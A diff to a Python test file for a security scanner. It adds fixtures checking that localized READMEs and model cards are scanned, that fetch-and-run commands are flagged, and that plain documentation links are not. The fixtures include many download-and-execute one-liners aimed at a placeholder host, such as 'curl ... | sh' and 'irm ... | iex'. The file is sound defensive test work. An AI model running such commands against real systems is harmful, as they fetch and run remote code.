@@ -71,8 +71,12 @@ def test_text_scanner_routes_extensionless_documentation_through_security_detect
     )
 
 
-def test_text_scanner_routes_localized_readme_through_security_detectors(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.en.md"
+@pytest.mark.parametrize("filename", ["README.en.md", "model_card.en.md", "modelcard.fr.rst"])
+def test_text_scanner_routes_localized_documentation_through_security_detectors(
+    tmp_path: Path,
+    filename: str,
+) -> None:
+    text_path = tmp_path / filename
     text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
 
     result = scan_file(str(text_path), config={"cache_scan_results": False})
@@ -87,8 +91,11 @@ def test_text_scanner_routes_localized_readme_through_security_detectors(tmp_pat
     )
 
 
-@pytest.mark.parametrize("filename", ["README.md.bak", "README.png"])
-def test_text_scanner_does_not_claim_readme_near_matches(tmp_path: Path, filename: str) -> None:
+@pytest.mark.parametrize(
+    "filename",
+    ["README.md.bak", "README.png", "model_card.md.bak", "model_card.png"],
+)
+def test_text_scanner_does_not_claim_documentation_near_matches(tmp_path: Path, filename: str) -> None:
     text_path = tmp_path / filename
     text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
 
@@ -165,6 +172,7 @@ def test_text_scanner_model_card_aliases_keep_documentation_urls_informational(
         "Webhook documentation: https://docs.example.com/webhooks\n",
         "C2 research: https://example.com/security\n",
         "config = {}  # docs: https://example.com/configuration\n",
+        'def load():\n    """See https://docs.example.com/reference."""\n',
     ],
 )
 def test_text_scanner_generic_documentation_url_labels_are_informational(
@@ -186,6 +194,8 @@ def test_text_scanner_generic_documentation_url_labels_are_informational(
     [
         'class Loader: "https://evil.example/payload"\n',
         'def load(): return "https://evil.example/payload"\n',
+        'def load():\n    return "https://evil.example/payload"\n',
+        'class Loader:\n    def endpoint(self):\n        if enabled:\n            return "https://evil.example/payload"\n',
     ],
 )
 def test_text_scanner_python_definitions_with_urls_remain_actionable(tmp_path: Path, content: str) -> None:
@@ -497,6 +507,14 @@ def test_text_scanner_earlier_network_library_call_is_not_hidden_by_later_prose(
         'sh -c "$(curl https://evil.example/payload)"\n',
         'sh -c "sudo curl https://evil.example/payload | sh"\n',
         'bash -c "sudo -u nobody HTTPS_PROXY=http://proxy.internal wget https://evil.example/payload"\n',
+        'bash -e -c "curl https://evil.example/payload | sh"\n',
+        'bash -lc "wget https://evil.example/payload"\n',
+        "cmd /c curl https://evil.example/payload\n",
+        "cmd.exe /C wget https://evil.example/payload\n",
+        "curl.exe https://evil.example/payload\n",
+        "wget.exe https://evil.example/payload\n",
+        "irm https://evil.example/payload | iex\n",
+        "Invoke-RestMethod https://evil.example/payload\n",
         'echo ready; sh -c "sudo curl https://evil.example/payload | sh"\n',
         "PS> iwr https://evil.example/payload\n",
         "`$ curl https://evil.example/payload | sh`\n",
@@ -523,6 +541,10 @@ def test_text_scanner_documentation_shell_substitution_remains_actionable(
     "content",
     [
         "Use sh -c with sudo and curl when appropriate; see https://docs.example.com/shell.\n",
+        "bash -lc is documented at https://docs.example.com/shell.\n",
+        "cmd /c is documented at https://docs.example.com/cmd.\n",
+        "curl.exe is documented at https://docs.example.com/curl.\n",
+        "Invoke-RestMethod documentation: https://docs.example.com/powershell.\n",
         "PS> is the prompt shown at https://docs.example.com/powershell.\n",
         "`Use curl for downloads`; see https://docs.example.com/shell.\n",
     ],
@@ -949,6 +971,8 @@ def test_text_scanner_documentation_code_like_prose_links_remain_informational(
         '{"webhook_urls": ["https://evil.example/payload"]}\n',
         "<endpoint>https://evil.example/payload</endpoint>\n",
         'endpoint = {"url": "https://evil.example/payload"}\n',
+        'endpoint = {\n  "url": "https://evil.example/payload"\n}\n',
+        'callback = {\n  "metadata": "value",\n  "uri": "https://evil.example/payload"\n}\n',
         "endpoint:\n  url: https://evil.example/payload\n",
         "Callback endpoint: https://evil.example/payload\n",
         "Webhook documentation endpoint: https://evil.example/payload\n",
